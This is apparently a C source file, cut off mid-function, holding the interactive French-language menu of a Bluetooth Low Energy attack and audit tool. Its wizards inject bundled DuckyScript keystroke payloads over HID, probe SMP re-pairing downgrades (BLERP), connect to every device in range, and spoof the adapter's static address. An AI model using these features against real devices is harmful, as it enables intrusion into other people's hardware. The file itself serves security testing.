// ========================================
//  nom du fichier: menu.c
//  description courte: The interactive menu and every wizard it drives
//  (scan, repair, secreq, autotry, guided audit pipeline, BLERP attack
//  wizard, "Option Finale" pipeline), plus the `autotry` and `keyboard`
//  subcommands which share helpers with it (run_hid_wizard, the payload
//  pickers). Extracted from src/main.c during the v2 rewrite's Phase 8
//  breakup -- this is the single largest, most internally-coupled part of
//  the tool (no automated test coverage: it is pure interactive terminal
//  I/O), so unlike the other Phase 8 extractions it was kept as one
//  cohesive file rather than split further, to avoid introducing a subtle
//  cross-file bug in code the test suite cannot catch.
//  dernière modification : 2026-10-10
//  auteur: GitHub/@gGaToRr
// ========================================

#include "menu.h"
#include "cmd/common.h"
#include "cmd/scan.h"
#include "cmd/gatt_cmd.h"
#include "cmd/repair_cmd.h"
#include "cmd/secreq_cmd.h"
#include "cmd/smp_cmd.h"
#include "cmd/blerp_cmd.h"

#include "ad_parse.h"
#include "addr_priv.h"
#include "audit.h"
#include "banner.h"
#include "dev_table.h"
#include "gatt.h"
#include "l2cap.h"
#include "mgmt.h"
#include "smp.h"
#include "ui.h"
#include "hid_cmd.h"
#include "fingerprint.h"
#include "smp_native.h"
#include "repair.h"
#include "secreq.h"
#include "peripheral_native.h"
#include "hci_dev.h"
#include "hci_cmd.h"
#include "hci_scan.h"
#include "hci_info.h"
#include "wire/hci_wire.h"
#include "cli.h"
#include "blerp_attack.h"
#include "blerp_mitm_relay.h"
#include "hardened_audit.h"

#include <dirent.h>
#include <errno.h>
#include <getopt.h>
#include <limits.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

// Path to the bundled DuckyScript payloads, listed by the HID wizard below.
// Baked in by the Makefile as an absolute path; the relative fallback keeps
// this file buildable on its own.
#ifndef BLEURP_PAYLOADS_DIR
#define BLEURP_PAYLOADS_DIR "src/hid/send_attack/payloads"
#endif

#define HID_PAYLOAD_MAX 32

// Read a payload file's first "REM ..." or "# ..." comment line as its
// short description (as written by every file under payloads/), or leave
// `out` empty if there is none.
static void payload_desc(const char *path, char *out, size_t out_len) {
    out[0] = '\0';
    FILE *f = fopen(path, "r");
    if (!f) return;
    char line[128];
    if (fgets(line, sizeof line, f)) {
        line[strcspn(line, "\r\n")] = '\0';
        const char *p = line;
        if (strncmp(p, "REM ", 4) == 0) p += 4;
        else if (p[0] == '#') { p++; while (*p == ' ') p++; }
        // Bounded copy in place of snprintf("%s", p): `line` is wider than
        // most description buffers, so gcc cannot prove %s fits and flags a
        // (harmless, intentional) possible truncation under -Werror.
        size_t n = strlen(p);
        if (n >= out_len) n = out_len - 1;
        memcpy(out, p, n);
        out[n] = '\0';
    }
    fclose(f);
}

// List the bundled DuckyScript payloads (*.txt under BLEURP_PAYLOADS_DIR),
// alphabetically, with their one-line description. Returns the count.
static int list_payloads(char names[][64], char paths[][256], char descs[][96]) {
    int n = 0;
    DIR *d = opendir(BLEURP_PAYLOADS_DIR);
    if (!d) return 0;

    struct dirent *ent;
    while (n < HID_PAYLOAD_MAX && (ent = readdir(d)) != NULL) {
        size_t len = strlen(ent->d_name);
        if (len < 5 || strcmp(ent->d_name + len - 4, ".txt") != 0) continue;
        snprintf(names[n], sizeof names[0], "%s", ent->d_name);
        snprintf(paths[n], sizeof paths[0], "%s/%s", BLEURP_PAYLOADS_DIR, ent->d_name);
        payload_desc(paths[n], descs[n], sizeof descs[0]);
        n++;
    }
    closedir(d);

    // Small insertion sort by name so the listing is stable and alphabetic.
    for (int i = 1; i < n; i++) {
        int j = i;
        while (j > 0 && strcmp(names[j - 1], names[j]) > 0) {
            char tn[64]; strcpy(tn, names[j - 1]); strcpy(names[j - 1], names[j]); strcpy(names[j], tn);
            char tp[256]; strcpy(tp, paths[j - 1]); strcpy(paths[j - 1], paths[j]); strcpy(paths[j], tp);
            char td[96]; strcpy(td, descs[j - 1]); strcpy(descs[j - 1], descs[j]); strcpy(descs[j], td);
            j--;
        }
    }
    return n;
}

// Show the bundled payloads by default and let the operator pick one by
// number, or type a custom file path. Fills `out` and returns 1, or
// returns 0 on an empty answer (cancel).
static int pick_payload(char *out, size_t out_len) {
    char names[HID_PAYLOAD_MAX][64], paths[HID_PAYLOAD_MAX][256], descs[HID_PAYLOAD_MAX][96];
    int n = list_payloads(names, paths, descs);

    printf("\n  %sPayloads disponibles%s (%s) :\n", UI_PINK, UI_RESET, BLEURP_PAYLOADS_DIR);
    if (n == 0) {
        printf("  (aucun payload trouve dans ce dossier)\n");
    }
    for (int i = 0; i < n; i++) {
        printf("  %s[-%d-]%s %-22s %s%s%s\n", UI_YELLOW, i + 1, UI_RESET,
               names[i], UI_PURPLE, descs[i], UI_RESET);
    }
    printf("\n  numero ci-dessus, ou un chemin de fichier personnalise (vide = annuler)\n> ");
    fflush(stdout);

    char line[256];
    if (read_line(line, sizeof line) < 0 || line[0] == '\0') return 0;

    char *end;
    long num = strtol(line, &end, 10);
    if (*end == '\0' && num >= 1 && num <= n) {
        snprintf(out, out_len, "%s", paths[num - 1]);
    } else {
        snprintf(out, out_len, "%s", line); // custom path
    }
    return 1;
}

// Forward declaration for BLERP target test engine.
static bool run_blerp_target_test(int dev_id, enum blerp_attack_type type,
                                  const uint8_t *addr, uint8_t atype,
                                  const char *as, const char *name, int8_t rssi,
                                  const struct smp_bond_info *pbond);
static bool run_blerp_all_4_tests(int dev_id, const uint8_t *addr, uint8_t atype,
                                  const char *as, const char *name, int8_t rssi,
                                  const struct smp_bond_info *pbond);

// Optional pre-step for the HID wizard: connect on the SMP fixed channel
// (CID 0x0006) and run the re-pairing downgrade probe (see smp.h). Reports
// the peer's raw negotiation behaviour -- never a bare "vulnerable" verdict,
// since replying to a Pairing Request is normal SMP behaviour; what matters
// is whether the peer's own AuthReq still lacks MITM/SC, and the signal is
// strongest against a device already paired with this controller (that is
// what the BLERP re-pairing vulnerabilities, NDSS 2026, are actually about).
static void run_smp_probe(const char *addr_str) {
    uint8_t addr[6];
    if (parse_addr(addr_str, addr) < 0) {
        printf("  adresse invalide, module SMP ignore.\n\n");
        return;
    }

    printf("  %sType%s (public/random) [public]: ", UI_PINK, UI_RESET);
    fflush(stdout);
    char t[16];
    uint8_t atype = BLEURP_BDADDR_LE_PUBLIC;
    if (read_line(t, sizeof t) == 0 && strncmp(t, "random", 6) == 0) {
        atype = BLEURP_BDADDR_LE_RANDOM;
    }

    printf("  connexion SMP (CID 0x%04x)...\n", BLEURP_SMP_CID);
    int fd = bleurp_l2_connect_cid_timeout(addr, atype, BLEURP_SMP_CID, 4000);
    if (fd < 0) {
        printf("  %sechec de connexion SMP%s (%s)\n\n", UI_RED, UI_RESET, strerror(errno));
        return;
    }

    struct smp_pairing_params resp;
    memset(&resp, 0, sizeof resp);
    smp_probe_t v = smp_downgrade_probe(fd, 4000, &resp);
    bleurp_l2_close(fd);

    if (v == SMP_PROBE_RESPONDED) {
        int mitm = (resp.auth_req & SMP_AUTHREQ_MITM) != 0;
        int sc   = (resp.auth_req & SMP_AUTHREQ_SC) != 0;
        printf("  %sreponse SMP%s : AuthReq peer=0x%02x  MITM=%s  SC=%s\n",
               UI_YELLOW, UI_RESET, resp.auth_req, mitm ? "oui" : "non", sc ? "oui" : "non");
        if (!mitm && !sc) {
            printf("  %s%sa suivi notre demande affaiblie%s (bonding seul) sans exiger plus fort\n",
                   UI_ORANGE, UI_BOLD, UI_RESET);
        }
    } else if (v == SMP_PROBE_REJECTED) {
        printf("  %srefuse%s : Pairing Failed en reponse a la demande affaiblie\n", UI_GREEN, UI_RESET);
    } else {
        printf("  pas de reponse SMP exploitable (timeout ou canal ferme)\n");
    }
    printf("  %s(signal plus parlant si l'appareil est deja appaire avec ce controleur --"
           " cf. BLERP, NDSS 2026, sur le RE-pairing)%s\n\n", UI_PURPLE, UI_RESET);
}

// [-3-] HID Payload: show the bundled payloads by default, ask a few short
// questions and run the injection. `target` pre-fills the address (e.g.
// when called with a device already picked from a scan); pass NULL to ask
// for it. This is the one place that calls hid_cmd_run's real, richer CLI
// (pairing, delay, --no-pair) instead of a bare, unlisted file-path prompt.
static void run_hid_wizard(const char *target) {
    signal(SIGINT, SIG_DFL);
    char addr[64];
    if (target) {
        snprintf(addr, sizeof addr, "%s", target);
        printf("  %sTarget%s: %s\n", UI_PINK, UI_RESET, addr);
    } else {
        printf("%sTarget address%s (AA:BB:CC:DD:EE:FF): ", UI_PINK, UI_RESET);
        fflush(stdout);
        if (read_line(addr, sizeof addr) < 0 || addr[0] == '\0') return;
    }

    if (ask_yes_no("Module SMP",
        "teste si l'appareil accepte un re-pairing affaibli, avant l'injection", 0)) {
        run_smp_probe(addr);
    }

    long index = ask_interface(bleurp_hci_find_default_dev());

    char payload[256];
    if (!pick_payload(payload, sizeof payload)) return;

    long delay = ask_number("Delai apres connexion (ms)",
        "pause avant d'injecter, laisse le temps au HID de s'etablir", 1000);
    int repair = ask_yes_no("Re-appairer",
        "pair+trust avant l'envoi ; decoche si deja appaire", 1);

    char iface[16], delay_s[16];
    snprintf(iface, sizeof iface, "hci%ld", index);
    snprintf(delay_s, sizeof delay_s, "%ld", delay);

    char *hid_argv[12];
    int n = 0;
    hid_argv[n++] = "hid";
    hid_argv[n++] = "-i"; hid_argv[n++] = iface;
    hid_argv[n++] = "-t"; hid_argv[n++] = addr;
    hid_argv[n++] = "-f"; hid_argv[n++] = payload;
    hid_argv[n++] = "-d"; hid_argv[n++] = delay_s;
    if (!repair) hid_argv[n++] = "--no-pair";
    hid_argv[n] = NULL;

    printf("\n");
    hid_cmd_run(n, hid_argv);

    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// One device's Auto-Try outcome: connect (bounded by `timeout_ms`), then run
// the same audit pipeline as do_audit (services -> characteristics ->
// classify every readable one) but tallied into counts instead of printed
// line by line, so a whole device list stays a compact scan. Returns 1 on a
// successful connection (whatever the audit finds), 0 if it never connects.
static int auto_try_probe(const uint8_t addr[6], uint8_t atype, int timeout_ms,
                          uint16_t *out_mtu, size_t *out_nsvc, size_t *out_nchr,
                          int *out_open) {
    int fd = bleurp_l2_connect_timeout(addr, atype, timeout_ms);
    if (fd < 0) return 0;

    uint16_t mtu = 0;
    (void)gatt_exchange_mtu(fd, 517, &mtu);

    struct gatt_service svcs[64];
    size_t nsvc = 0;
    gatt_discover_services(fd, svcs, 64, &nsvc);
    size_t sshown = nsvc < 64 ? nsvc : 64;

    size_t nchr = 0;
    int open_count = 0;
    for (size_t i = 0; i < sshown; i++) {
        struct gatt_char chs[64];
        size_t nch = 0;
        gatt_discover_characteristics(fd, svcs[i].start_handle, svcs[i].end_handle,
                                      chs, 64, &nch);
        size_t cshown = nch < 64 ? nch : 64;
        nchr += cshown;
        for (size_t j = 0; j < cshown; j++) {
            if (!(chs[j].properties & GATT_PROP_READ)) continue;
            uint8_t buf[64];
            size_t len = 0;
            uint8_t err = 0;
            int rc = gatt_read(fd, chs[j].value_handle, buf, sizeof buf, &len, &err);
            if (audit_classify_read(rc == 0, err) == AUDIT_OPEN) open_count++;
        }
    }

    bleurp_l2_close(fd);
    *out_mtu = mtu ? mtu : 23;
    *out_nsvc = nsvc;
    *out_nchr = nchr;
    *out_open = open_count;
    return 1;
}

// [-4-] Auto-Try [Agressive]: connect to every device in the list, one by
// one, and run the audit pipeline above on each successful connection, then
// report which ones succeeded and what they exposed. Deliberately blunt (no
// pairing, no address-type guessing beyond what the scan already saw) --
// this is a fast recon pass across everything found, not a targeted attack.
// Ctrl-C stops the pass cleanly and returns here, same as the scan itself.
// Authorized targets only, same as every other connecting feature here.
// Connects to every device in the table, one at a time, and reports the
// unauthenticated access found. `interactive` adds the final "entree" pause
// used by the wizard; the CLI passes 0.
static void run_auto_try(struct dev_table *table, long timeout_ms, int interactive) {
    dev_table_sort_by_rssi(table);
    size_t cnt = dev_table_count(table);
    if (cnt == 0) { printf("\naucun appareil dans la liste.\n"); return; }

    printf("\n  %sAuto-Try %s[Agressive]%s \342\200\224 %zu appareil(s), Ctrl-C pour arreter\n\n",
           UI_YELLOW, UI_ORANGE, UI_RESET, cnt);

    signal(SIGINT, on_sigint);
    g_stop = 0;

    int ok_count = 0, open_devices = 0;
    for (size_t i = 0; i < cnt && !g_stop; i++) {
        const struct dev_entry *e = dev_table_at(table, i);
        const uint8_t *a = e->address;
        const char *name = (e->has_name && e->name[0] != '\0') ? e->name : "(unknown)";

        printf("  [%2zu/%2zu] %02X:%02X:%02X:%02X:%02X:%02X  %-20s ... ",
               i + 1, cnt, a[5], a[4], a[3], a[2], a[1], a[0], name);
        fflush(stdout);

        uint16_t mtu = 0;
        size_t nsvc = 0, nchr = 0;
        int open_count = 0;
        if (!auto_try_probe(a, e->addr_type, (int)timeout_ms, &mtu, &nsvc, &nchr, &open_count)) {
            printf("%sechec%s\n", UI_RED, UI_RESET);
            continue;
        }

        ok_count++;
        if (open_count > 0) {
            open_devices++;
            printf("%sCONNECTE%s  MTU=%u  svc=%zu chr=%zu  %s%s!%d ouvert(s)%s\n",
                   UI_GREEN, UI_RESET, mtu, nsvc, nchr, UI_ORANGE, UI_BOLD, open_count, UI_RESET);
        } else {
            printf("%sCONNECTE%s  MTU=%u  svc=%zu chr=%zu\n",
                   UI_GREEN, UI_RESET, mtu, nsvc, nchr);
        }
    }

    signal(SIGINT, SIG_DFL);
    printf("\n  %s%d/%zu connexion(s) reussie(s)%s", UI_PINK, ok_count, cnt, UI_RESET);
    if (open_devices > 0) {
        printf("  %s\342\200\224 %d avec de la lecture sans pairing%s", UI_ORANGE, open_devices, UI_RESET);
    }
    printf("\n");
    if (!interactive) return;
    printf("(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// Usage line for `autotry` only (usage() would print the whole command list).
static int autotry_usage(int rc) {
    fprintf(stderr, "Usage: bleurp autotry [-i index] [-t seconds] [-T ms]\n"
                    "  -t seconds  scan duration before the pass (default 15, > 0)\n"
                    "  -T ms       connection timeout per device (default 4000)\n");
    return rc;
}

// CLI: bleurp autotry [-i index] [-t seconds] [-T ms]. Scans, then runs the
// Auto-Try pass on every device found, without prompts.
int cmd_autotry(int argc, char **argv) {
    int index = 0;
    long duration = 15;
    long timeout_ms = 4000;

    long v = 0;
    int opt;
    while ((opt = getopt(argc, argv, "i:t:T:h")) != -1) {
        switch (opt) {
        case 'i':
            if (parse_long_arg(optarg, 10, 0, 255, &v) < 0) {
                fprintf(stderr, "autotry: -i invalide '%s' (attendu un index 0-255)\n", optarg);
                return 2;
            }
            index = (int)v;
            break;
        case 't':
            if (parse_long_arg(optarg, 10, 0, LONG_MAX, &duration) < 0) {
                fprintf(stderr, "autotry: -t invalide '%s'\n", optarg);
                return 2;
            }
            break;
        case 'T':
            if (parse_long_arg(optarg, 10, 0, LONG_MAX, &timeout_ms) < 0) {
                fprintf(stderr, "autotry: -T invalide '%s'\n", optarg);
                return 2;
            }
            break;
        case 'h': return autotry_usage(0);
        default:  return autotry_usage(2);
        }
    }
    if (duration <= 0 || timeout_ms <= 0) {
        fprintf(stderr, "autotry: -t et -T doivent etre > 0\n");
        return 2;
    }

    struct dev_table table;
    if (dev_table_init(&table) < 0) { perror("dev_table_init"); return 1; }
    if (run_scan(index, duration, 0, &table) < 0) {
        dev_table_free(&table);
        return 1;
    }
    printf("\nScan termine : %zu appareil(s).\n", dev_table_count(&table));
    run_auto_try(&table, timeout_ms, 0);
    dev_table_free(&table);
    return 0;
}

// After a scan: show the results and propose next steps on a device from
// the list (enum GATT, audit, HID payload, or an Auto-Try pass across all
// of them), or go back. This is the menu's link between "found a device"
// and "do something with it".
static void post_scan_actions(struct dev_table *table) {
    signal(SIGINT, SIG_DFL);
    for (;;) {
        dev_table_sort_by_rssi(table);
        size_t cnt = dev_table_count(table);
        size_t shown = cnt < 20 ? cnt : 20;

        printf("\n  %s%zu appareil(s) trouve(s)%s\n", UI_PINK, cnt, UI_RESET);
        char row[192];
        for (size_t i = 0; i < shown; i++) {
            ui_format_row(row, sizeof row, (int)i + 1, dev_table_at(table, i));
            printf("  %s\n", row);
        }

        printf("\n  %sEtape suivante%s :\n", UI_YELLOW, UI_RESET);
        printf("  %s[-1-]%s Enum GATT      %ssur un appareil de la liste%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-2-]%s Audit GATT     %sacces sans pairing, sur un appareil%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-3-]%s HID Payload    %senvoyer un payload a un appareil%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-4-]%s Auto-Try %s[Agressive]%s %sconnexion sur chaque appareil de la liste%s\n",
               UI_YELLOW, UI_RESET, UI_ORANGE, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-5-]%s SMP Probe      %ssonde d'appairage native (HCI User Channel)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-6-]%s Test BLERP     %sattaque re-pairing CI (sacca97/blerp)%s\n",
               UI_GREEN, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-Q-]%s Retour au menu principal%s\n\n> ", UI_PINK, UI_RESET, UI_RESET);
        fflush(stdout);

        char line[64];
        if (read_line(line, sizeof line) < 0) return;
        if (line[0] == 'q' || line[0] == 'Q' || line[0] == '\0') return;
        if (line[0] == '4') {
            long timeout_ms = ask_number("Timeout par appareil (ms)",
                "temps max avant d'abandonner une connexion", 4000);
            run_auto_try(table, timeout_ms, 1);
            continue;
        }
        if (line[0] != '1' && line[0] != '2' && line[0] != '3' && line[0] != '5' && line[0] != '6') continue;
        if (shown == 0) { printf("aucun appareil dans la liste.\n"); continue; }

        long num = ask_number("Appareil #", "numero dans la liste ci-dessus", 0);
        if (num < 1 || (size_t)num > shown) {
            printf("numero invalide.\n");
            continue;
        }
        const struct dev_entry *e = dev_table_at(table, (size_t)num - 1);

        printf("\n");
        if (line[0] == '1') {
            do_enum(e->address, e->addr_type);
        } else if (line[0] == '2') {
            do_audit(e->address, e->addr_type);
        } else if (line[0] == '3') {
            char addr_s[18];
            snprintf(addr_s, sizeof addr_s, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            run_hid_wizard(addr_s);
        } else if (line[0] == '5') {
            char addr_s[18];
            snprintf(addr_s, sizeof addr_s, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            printf("Lancement de la sonde SMP native sur %s...\n", addr_s);
            struct smp_probe_result res;
            if (smp_native_probe_device(0, e->address, e->addr_type, 6000, &res) < 0) {
                fprintf(stderr, "Sonde SMP échouée (vérifiez l'état de l'adaptateur ou lancez ./scripts/reset_bluetooth.sh)\n");
            } else {
                smp_native_print_result(&res, addr_s);
            }
        } else if (line[0] == '6') {
            char addr_s[18];
            snprintf(addr_s, sizeof addr_s, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            const char *name = (e->has_name && e->name[0]) ? e->name : "Inconnu";
            char adapter[18];
            struct smp_bond_info bond;
            struct smp_bond_info *pbond = (smp_adapter_addr(0, adapter) == 0 &&
                                           smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, addr_s, &bond) == 0) ? &bond : NULL;
            if (run_blerp_target_test(0, BLERP_ATTACK_CI, e->address, e->addr_type, addr_s, name, e->rssi, pbond)) {
                banner_print_success(stdout);
            }
        }

        if (line[0] != '3') { // run_hid_wizard already pauses on its own
            printf("\n(entree pour continuer) ");
            fflush(stdout);
            char b[8];
            (void)read_line(b, sizeof b);
        }
    }
}

// [-1-] Scan: ask a few short questions (verbose, duration, interface),
// clear the screen and launch the scan. Ctrl-C stops the scan cleanly, then
// the results and a next-steps menu are shown before returning to the menu.
static void menu_scan_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\033[2J\033[H");
    printf("  %s[-1-] Scan%s \342\200\224 quelques questions avant de lancer :\n\n",
           UI_YELLOW, UI_RESET);
    int verbose = ask_yes_no("Verbose",
        "detail vendor/services sous chaque appareil", 1);
    long duration = ask_number("Duree (secondes)",
        "temps de scan ; 0 = illimite jusqu'a Ctrl-C", 30);
    long index = ask_interface(bleurp_hci_find_default_dev());
 
     struct dev_table table;
     if (dev_table_init(&table) < 0) { perror("dev_table_init"); return; }
 
     printf("\033[2J\033[H"); // clear once, then run_scan takes over the view
     int rc = run_scan((int)index, duration, verbose, &table);
     if (rc < 0) {
         printf("\nscan indisponible (voir le message ci-dessus).\n");
         printf("(entree pour revenir au menu) ");
         fflush(stdout);
         char b[8];
         (void)read_line(b, sizeof b);
     } else {
         post_scan_actions(&table);
     }
     dev_table_free(&table);
 }
 
 // Call one of the CLI commands (cmd_repair, cmd_secreq, cmd_autotry) with an
// argument list built by a menu wizard. getopt keeps its position between
// calls, so optind is reset before each one.
static int run_cli_command(int (*cmd)(int, char **), char **args, int n) {
    optind = 1;
    return cmd(n, args);
}

// [-7-] Re-pairing: with no identity address, lists the bonds; with one, runs
// the same check as `bleurp repair` (offers a weaker pairing, reads the reply).
static void menu_repair_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\n  %s=== Re-pairing (BLERP) ===%s\n", UI_PINK, UI_RESET);
    long dev_id = ask_interface(bleurp_hci_find_default_dev());

    printf("  %sIdentité du bond%s  %s(AA:BB:CC:DD:EE:FF ; vide = liste des bonds)%s: ",
           UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
    fflush(stdout);
    char id[32];
    if (read_line(id, sizeof id) < 0) return;

    char idx[16], type[16] = "public", rpa[32] = "";
    snprintf(idx, sizeof idx, "%ld", dev_id);
    if (id[0] != '\0') {
        printf("  %sType%s  %s(public/random)%s [public]: ", UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
        fflush(stdout);
        char t[16];
        if (read_line(t, sizeof t) < 0) return;
        if (strncmp(t, "random", 6) == 0) snprintf(type, sizeof type, "random");

        printf("  %sAdresse courante (RPA)%s  %s(vide = identité)%s: ", UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
        fflush(stdout);
        if (read_line(rpa, sizeof rpa) < 0) return;
    }

    char *args[10];
    int n = 0;
    args[n++] = "repair";
    if (id[0] != '\0') args[n++] = id;
    args[n++] = "-i";
    args[n++] = idx;
    if (id[0] != '\0') {
        args[n++] = "-t";
        args[n++] = type;
        if (rpa[0] != '\0') {
            args[n++] = "-c";
            args[n++] = rpa;
        }
    }

    printf("\n");
    (void)run_cli_command(cmd_repair, args, n);
    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// [-8-] Security Request: waits for the bonded Central to connect, then reports
// how it answers the ARSR we send (`bleurp secreq`). The Central must connect
// during the wait, so this stays interactive.
static void menu_secreq_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\n  %s=== Test Security Request (BLERP) ===%s\n", UI_PINK, UI_RESET);
    long dev_id = ask_interface(bleurp_hci_find_default_dev());

    printf("  %sIdentité du bond%s  %s(AA:BB:CC:DD:EE:FF)%s: ", UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
    fflush(stdout);
    char id[32];
    if (read_line(id, sizeof id) < 0) return;
    if (id[0] == '\0') {
        printf("  %sadresse d'identité requise.%s\n", UI_RED, UI_RESET);
    } else {
        printf("  %sARSR%s  %s(hex ou décimal ; vide = ARPK estimé du bond)%s: ",
               UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
        fflush(stdout);
        char arsr[16];
        if (read_line(arsr, sizeof arsr) < 0) return;
        printf("  %sMode%s  %s(1 = standard, 2 = V5 rejet du chiffrement, 3 = V3 réponse plus faible)%s [1]: ",
               UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
        fflush(stdout);
        char mode_line[8];
        if (read_line(mode_line, sizeof mode_line) < 0) return;
        const char *mode_arg = (mode_line[0] == '2') ? "v5" : (mode_line[0] == '3') ? "v3" : "plain";
        long wait_conn = ask_number("Attente de connexion", "secondes", 60);
        long wait_react = ask_number("Attente de réaction", "secondes", 10);

        char idx[16], conn[16], react[16];
        snprintf(idx, sizeof idx, "%ld", dev_id);
        snprintf(conn, sizeof conn, "%ld", wait_conn);
        snprintf(react, sizeof react, "%ld", wait_react);

        char *args[12];
        int n = 0;
        args[n++] = "secreq";
        args[n++] = id;
        args[n++] = "-i";
        args[n++] = idx;
        args[n++] = "-c";
        args[n++] = conn;
        args[n++] = "-w";
        args[n++] = react;
        args[n++] = "-m";
        args[n++] = (char *)mode_arg;
        if (arsr[0] != '\0') {
            args[n++] = "-r";
            args[n++] = arsr;
        }

        printf("\n  %sAppareil prêt à se connecter, puis Entrée pour lancer : %s", UI_PINK, UI_RESET);
        fflush(stdout);
        char go[8];
        if (read_line(go, sizeof go) < 0) return;
        (void)run_cli_command(cmd_secreq, args, n);
    }

    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// [-9-] Tout tester: scan, then connect and read GATT on every device found
// (`bleurp autotry`). Touches every device in range, so it asks for a typed "oui".
static void menu_autotry_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\n  %s=== Tout tester : appareils découverts ===%s\n", UI_PINK, UI_RESET);
    printf("  %sScan puis connexion sur chaque appareil à portée (les tiens et les autres).%s\n",
           UI_ORANGE, UI_RESET);
    long dev_id = ask_interface(bleurp_hci_find_default_dev());
    long scan_sec = ask_number("Durée du scan", "secondes", 15);
    long timeout_ms = ask_number("Timeout par appareil", "ms", 4000);

    printf("\n  %sTape oui pour lancer (autre chose = annuler) : %s", UI_PINK, UI_RESET);
    fflush(stdout);
    char confirm[16];
    if (read_line(confirm, sizeof confirm) < 0 || strcmp(confirm, "oui") != 0) {
        printf("  annulé.\n");
    } else {
        char idx[16], scan[16], timeout[16];
        snprintf(idx, sizeof idx, "%ld", dev_id);
        snprintf(scan, sizeof scan, "%ld", scan_sec);
        snprintf(timeout, sizeof timeout, "%ld", timeout_ms);
        char *args[] = { "autotry", "-i", idx, "-t", scan, "-T", timeout, NULL };
        (void)run_cli_command(cmd_autotry, args, 7);
    }

    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// [-A-] Audit complet: runs scripts/audit_ble.sh, which has its own menu
// (identification, bond, SMP, re-pairing, Security Request, report).
static void menu_audit_script(void) {
    signal(SIGINT, SIG_DFL);
    const char *script = "scripts/audit_ble.sh";
    if (access(script, X_OK) != 0) {
        printf("  %s[-] %s introuvable ou non exécutable (lance le menu depuis la racine du projet).%s\n",
               UI_RED, script, UI_RESET);
    } else {
        printf("\n");
        fflush(stdout);
        (void)system(script);
    }
    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// Interactive main menu (shown when bleurp runs with no subcommand).
 // [-4-] MAC Spoofer: set the controller's LE static random address (kernel
 // mgmt Set Static Address, 0x002c). Only the *random* address is portable
 // from userspace on Linux this way; the burned-in "public" address needs
 // proprietary, chipset-specific HCI commands and is out of scope here.
 static void menu_mac_spoofer(void) {
     signal(SIGINT, SIG_DFL);
     printf("\033[2J\033[H");
     printf("  %s[-4-] MAC Spoofer%s\n\n", UI_YELLOW, UI_RESET);
     printf("  %sNe change que l'adresse aleatoire statique (random static).%s\n",
            UI_PURPLE, UI_RESET);
     printf("  %sL'adresse publique (burned-in) depend du chipset, pas supportee ici.%s\n\n",
            UI_PURPLE, UI_RESET);
 
     long index = ask_interface(bleurp_hci_find_default_dev());
 
     printf("  %sNouvelle adresse%s (AA:BB:CC:DD:EE:FF) : ", UI_PINK, UI_RESET);
     fflush(stdout);
     char a[64];
     if (read_line(a, sizeof a) < 0 || a[0] == '\0') return;
 
     uint8_t addr[6];
     if (parse_addr(a, addr) < 0) {
         printf("  adresse invalide.\n");
     } else {
         addr[5] |= 0xC0;
 
         int fd = mgmt_open();
         if (fd < 0) {
             perror("mgmt_open");
         } else {
             uint8_t cmd[16], buf[64];
             ssize_t n = mgmt_build_set_static_address(cmd, sizeof cmd, (uint16_t)index, addr);
             if (send_pkt(fd, cmd, n) < 0) {
                 perror("write");
             } else {
                 ssize_t r = read(fd, buf, sizeof buf);
                 struct mgmt_hdr h;
                 uint8_t status = 0xff;
                 if (r >= 9 && mgmt_parse_header(buf, (size_t)r, &h) == 0 &&
                     (h.opcode == MGMT_EV_CMD_STATUS || h.opcode == MGMT_EV_CMD_COMPLETE)) {
                     status = buf[8];
                 }
                 if (status == 0x00) {
                     printf("  %sOK%s : adresse statique = %02X:%02X:%02X:%02X:%02X:%02X\n",
                            UI_GREEN, UI_RESET, addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);
                     printf("  %s(coupez/rallumez l'adaptateur, ou redemarrez le scan, pour"
                            " qu'elle serve en connexion/pub)%s\n", UI_PURPLE, UI_RESET);
                 } else {
                     printf("  %secec%s : mgmt status 0x%02x%s\n", UI_RED, UI_RESET, status,
                            status == 0x14 ? " (Permission Denied : sudo ou setcap requis)" : "");
                 }
             }
             mgmt_close(fd);
         }
     }
 
     printf("\n(entree pour continuer) ");
     fflush(stdout);
     char b[8];
     (void)read_line(b, sizeof b);
 }
 
 // [-5-] SMP Probe wizard
 static void menu_smp_wizard(void) {
     signal(SIGINT, SIG_DFL);
     printf("\033[2J\033[H");
     printf("  %s[-5-] SMP Probe (Native)%s \342\200\224 sonde de sécurité d'appairage BLE\n\n",
